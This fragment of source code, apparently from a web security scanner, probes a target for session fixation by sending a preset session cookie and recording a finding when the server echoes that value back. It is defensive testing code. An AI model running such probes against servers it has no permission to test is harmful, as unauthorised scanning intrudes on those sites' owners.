          const resp1 = await sendRequest({
            method: "GET",
            url: target,
            headers: {
              "User-Agent": this.userAgent,
              Cookie: `${sessionName}=${fixedValue}`,
              Accept: "text/html",
            },
          });

          // Check if the response sets the same session value back (session fixation)
          const setCookieHeader =
            resp1.headers["set-cookie"] || "";
          if (setCookieHeader.includes(fixedValue)) {
            yield buildAuthBypassFinding({
              target,
              endpoint: target,
              method: "GET",
              bypassType: "Session Fixation",
              technique: `Server accepted pre-set ${sessionName}=${fixedValue}`,
              confidence: 75,
              evidence:
                `The server accepted a client-supplied session identifier ` +
                `"${sessionName}=${fixedValue}" and echoed it back in Set-Cookie. ` +
                `This allows an attacker to fixate a victim's session to a known value.`,
              responseBody: resp1.body,
              responseStatus: resp1.status,
              severity: Severity.Medium,
            });
            break;
          }
        } catch {
          continue;
        }
      }
    }
  }
}
